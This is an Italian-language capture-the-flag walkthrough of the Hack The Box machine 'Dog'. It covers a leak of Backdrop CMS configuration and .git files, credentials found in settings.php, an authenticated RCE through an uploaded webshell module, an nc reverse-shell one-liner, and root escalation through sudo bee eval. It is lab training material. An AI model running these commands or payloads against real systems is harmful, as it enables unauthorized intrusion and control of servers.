# DOG – HTB Walkthrough

## 📍 Enumeration

```bash
nmap -sS -p- dog -T5
```

Output:

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Port 80 mostra un sito web con pagine di **login** e **reset password**. Nella pagina di reset, l'input dell'utente viene riflesso direttamente nell'HTML. Esempio:

```plaintext
Sorry, abc; is not recognized as a user name or an email address.
```

In fondo alla pagina si nota: `Powered by Backdrop CMS`

## 🔎 Config e Git leak

Backdrop salva le configurazioni in percorsi prevedibili:

```
http://dog/files/config_<hash>/active/
```

Esplorando `/files/`, si trova:

```
config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/
```

Dentro i file config, si estrae l'email `tiffany@dog.htb` e si trovano anche le credenziali nel file `settings.php`:

```php
'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'
```

Successivamente, si prova ad accedere alla root del progetto Git:

```
http://dog/.git
```

Con `git-dumper` si clona il repository:

```bash
git-dumper http://dog/.git dog_repo
```

## 🔎 Admin Login & Exploit

Tramite la password trovata nel config, si accede al pannello admin di Backdrop.
Versione: **Backdrop CMS 1.27.1**

```bash
searchsploit CMS 1.27.1
```

Risultato:

```
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) | php/webapps/52021.py
```

Si genera l'exploit:

```bash
python3 52021.py http://dog
```

Questo crea il file `shell.zip`. Backdrop non accetta `.zip`, quindi:

```bash
tar -czf shell.tar.gz shell/
```

Upload del modulo via interfaccia admin: `http://dog/admin/modules/install`

Una volta installato, si accede a:

```
http://dog/modules/shell/shell.php
```

E si esegue una reverse shell:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.3 8080 >/tmp/f
```

Listener:

```bash
nc -lvnp 8080
```

## 🧹 Accesso come johncusack

La stessa password di MySQL funziona anche per l'utente `johncusack`, sia via shell che via SSH:

```bash
ssh johncusack@dog
Password: BackDropJ2024DS2024
```

Si ottiene la flag user:

```bash
cat ~/user.txt
[REDACTED]
```

## 🚁 Privilege Escalation via bee

```bash
sudo -l
```

Output:

```
(ALL : ALL) /usr/local/bin/bee
```

Si nota che `bee` è un link a uno script PHP:

```bash
ls -l /usr/local/bin/bee
lrwxrwxrwx 1 root root 26 Jul  9  2024 /usr/local/bin/bee -> /backdrop_tool/bee/bee.php
```

Testando un comando:

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "system('id');"
```

Risultato:

```
uid=0(root) gid=0(root) groups=0(root)
```

🚀 BOOM! Possiamo eseguire comandi come root.

### Shell completa:

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```

E la flag root:

```bash
cat /root/root.txt
[REDACTED]
```

## 🏁 Summary

| Step          | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| Enumeration   | Identificati Backdrop CMS e leak nei file di configurazione |
| Git Leak      | Dump del repository tramite `.git/`                         |
| Admin Login   | Credenziali da `settings.php`                               |
| Exploit       | RCE autenticato con modulo Backdrop (tar.gz)                |
| Reverse Shell | Shell ottenuta via PHP webshell                             |
| SSH           | Login come `johncusack` con stessa password                 |
| PrivEsc       | `sudo bee` consente esecuzione comandi root                 |
| Root Flag     | Letta da `/root/root.txt`                                   |

🎉 Rooted!

